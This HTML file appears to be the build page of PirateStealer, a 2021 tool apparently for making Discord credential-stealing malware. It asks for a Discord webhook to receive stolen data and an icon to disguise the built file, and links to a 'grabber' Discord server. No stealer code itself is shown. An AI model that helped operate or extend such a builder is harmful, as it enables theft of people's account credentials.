<!DOCTYPE html>
<html>

<head>
	<title>PirateStealer - Build</title>

	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />

	<link rel="stylesheet" type="text/css" media="screen" href="css/main.css" />
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
	<link href="http://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet" />

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="http://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
	<script src="js/particles.js"></script>
	<script defer src="js/build.js"></script>
</head>

<body>
	<div class="floating_toolbar">
		<div class="fbtl_container">
			<a class="tool_button" href="https://discord.gg/grabber" target="_blank" rel="noopener">
				<span class="material-icons">diamond</span>
			</a>
			<a class="tool_button" href="/home.html">
				<span class="material-icons">home</span>
			</a>
			<a class="tool_button active" href="/build.html">
				<span class="material-icons">plumbing</span>
			</a>
			<a class="tool_button" href="/settings.html">
				<span class="material-icons">tune</span>
			</a>
			<a class="tool_button" href="/plugins.html">
				<span class="material-icons">extension</span>
			</a>
			<a class="tool_button" href="/login.html">
				<span class="material-icons">login</span>
			</a>
		</div>
	</div>

	<main>
		<div class="form_container">
			<div class="input_group">
				<label for="webhookInput">WEBHOOK</label>
				<input class="core_input" type="text" id="webhookInput"
					placeholder="https://discord.com/api/webhook/XXXXX">
			</div>
			<label id="labelBuild" class="uploadFile" for="fileInput">
				<img src="assets/Upload Icon.svg" class="icon" alt="Upload Icon" draggable="false">
				<span id="uploadicontext" class="text">Upload Icon</span>
				<input type="file" id="fileInput" accept=".ico" hidden />
			</label>
			<span class="alert">By building, you accept the<a href="/terms.html" class="link"> terms of
					PirateStealer.</a></span>
			<button id="build" class="core_button">Build</button>
		</div>
		<div id="particles-js"></div>
	</main>

	<footer>&copy; PirateStealer 2021</footer>
</body>

</html>
